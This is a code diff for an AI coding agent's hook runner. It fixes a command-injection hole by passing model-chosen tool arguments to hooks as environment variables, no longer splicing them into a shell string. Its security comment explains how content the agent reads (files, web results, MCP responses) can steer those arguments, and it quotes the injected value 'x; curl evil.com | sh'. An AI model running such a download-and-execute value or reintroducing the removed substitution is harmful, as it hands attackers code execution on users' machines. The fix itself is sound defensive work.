@@ -30,19 +30,30 @@ export interface HookOutcome {
   notices: string[];
 }
 
-/** Replaces $token with the string value of args[token] (exact key or its
- * uppercase form); unknown tokens stay literal so real env vars survive
- * until the shell expands them. */
-export function expandArgTokens(command: string, args: unknown): string {
-  if (typeof args !== "object" || args === null) return command;
-  let expanded = command;
-  for (const [key, value] of Object.entries(args as Record<string, unknown>)) {
-    if (typeof value !== "string") continue;
-    for (const token of [`$${key}`, `$${key.toUpperCase()}`]) {
-      expanded = expanded.split(token).join(value);
-    }
-  }
-  return expanded;
+/**
+ * SECURITY: tool arguments reach hooks as environment variables and as the
+ * JSON payload on stdin — never by substitution into the command string.
+ *
+ * An earlier version spliced `args[key]` into `hook.run` before handing it
+ * to a `shell: true` spawn. Tool arguments are chosen by the model, and the
+ * model's choices can be steered by whatever it just read (a file, a
+ * webfetch result, an MCP response), so an audit hook as innocuous as
+ * `echo $path >> log.txt` became arbitrary command execution the moment a
+ * path came back as `x; curl evil.com | sh`. Environment variables carry
+ * the same data with none of that: the shell expands `$STAK_TOOL_ARGS` to
+ * one value and never re-parses it as syntax.
+ */
+export function hookEnv(
+  invocation: HookInvocation,
+  phase: "beforeTool" | "afterTool",
+): NodeJS.ProcessEnv {
+  return {
+    ...process.env,
+    STAK_HOOK_PHASE: phase,
+    STAK_TOOL_NAME: invocation.tool,
+    STAK_TOOL_ARGS: JSON.stringify(invocation.args ?? null),
+    STAK_PROJECT_DIR: invocation.cwd,
+  };
 }
 
 export class HookRunner {
@@ -68,7 +79,7 @@ export class HookRunner {
       ) {
         continue;
       }
-      const result = await this.spawnOne(hook, payload, invocation.cwd);
+      const result = await this.spawnOne(hook, payload, invocation, phase);
       if (result.ok) continue;
 
       const detail = result.stderr.trim();
@@ -93,7 +104,8 @@ export class HookRunner {
   private spawnOne(
     hook: HookEntry,
     payload: string,
-    cwd: string,
+    invocation: HookInvocation,
+    phase: "beforeTool" | "afterTool",
   ): Promise<{ ok: boolean; code: number | null; stderr: string }> {
     // Entries built outside parseHooks (tests, future programmatic callers)
     // may omit timeout — fall back rather than letting setTimeout treat
@@ -103,9 +115,12 @@ export class HookRunner {
       // Default stdio pipes all three streams: stdout must be drained so
       // chatty hooks can't deadlock on a full pipe buffer, stderr is captured
       // to explain vetoes and failures.
-      const child = spawn(expandArgTokens(hook.run, payloadArgs(payload)), {
+      // hook.run is spawned verbatim — the only strings the shell ever sees
+      // come from the user's own config, never from model-chosen tool args.
+      const child = spawn(hook.run, {
         shell: true,
-        cwd,
+        cwd: invocation.cwd,
+        env: hookEnv(invocation, phase),
       });
       let stderr = "";
       let settled = false;
@@ -139,13 +154,5 @@ export class HookRunner {
 
       child.stdin?.end(payload);
     });
-  }
-}
-
-function payloadArgs(payload: string): unknown {
-  try {
-    return (JSON.parse(payload) as { args?: unknown }).args;
-  } catch {
-    return undefined;
   }
 }
